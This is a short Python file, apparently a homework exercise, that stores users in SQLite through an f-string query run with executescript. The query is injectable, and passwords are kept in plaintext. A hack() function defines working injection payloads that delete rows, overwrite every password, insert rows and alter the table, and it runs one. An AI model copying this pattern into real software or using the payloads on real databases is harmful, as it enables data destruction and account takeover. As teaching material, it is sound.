import sqlite3


def register(username: str, password: str) -> None:
    with sqlite3.connect('./database/hw.db') as conn:
        cursor = conn.cursor()
        _create_table(cursor)
        cursor.executescript(
            f"""
            INSERT INTO table_users (username, password)
            VALUES ('{username}', '{password}')
            """
        )
        conn.commit()


def _create_table(cursor: sqlite3.Cursor) -> None:
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS table_users (
    id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,  
    username TEXT NOT NULL,
    password TEXT NOT NULL
    )
    """)


def hack() -> None:
    delete_injection: str = "1'); DELETE FROM table_users WHERE id = 10; --"
    update_injection: str = "1'); UPDATE table_users SET password = 'update_injection'; --"
    insert_injection: str = "1'); INSERT INTO table_users (username, password) VALUES ('insert', 'injection'); --"
    alter_injection: str = "1'); ALTER TABLE table_users ADD COLUMN alter_injection; --"
    username: str = "2"
    password: str = insert_injection
    register(username, password)


if __name__ == '__main__':
    hack()
